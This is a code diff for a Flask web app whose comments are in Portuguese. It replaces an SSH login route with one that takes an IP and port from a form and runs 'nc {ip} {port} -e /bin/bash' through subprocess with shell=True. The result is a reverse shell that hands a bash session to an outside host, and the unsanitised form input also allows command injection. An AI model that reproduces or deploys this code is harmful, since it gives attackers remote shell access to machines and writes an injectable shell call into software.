@@ -76,24 +76,16 @@ def opcao3():
     if request.method == 'POST':
         ip = request.form['ip']
         port = request.form['port']
-        username = request.form['username']
-        password = request.form['password']  # Senha para autenticação SSH
-        
+
+        # Comando para estabelecer a conexão de shell reverso
+        command = f"nc {ip} {port} -e /bin/bash"
         try:
-            client = paramiko.SSHClient()
-            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-            client.connect(ip, port=int(port), username=username, password=password)
-
-            # Cria um canal e abre um shell
-            shell = client.invoke_shell()
-            shell.send("echo 'Conexão estabelecida!'\n")
-
-            # Recebe a saída
-            output = shell.recv(1024).decode()
-            return render_template('ssh_output.html', output=output)
-        
-        except Exception as e:
-            return f"Erro ao conectar via SSH: {str(e)}"
+            # Executa o comando
+            result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            output = result.stdout.decode() + result.stderr.decode()
+            return render_template('command_output.html', output=output)
+        except subprocess.CalledProcessError as e:
+            return f"Erro ao executar o comando: {e}"
 
     return render_template('reverse_shell_input.html')
 
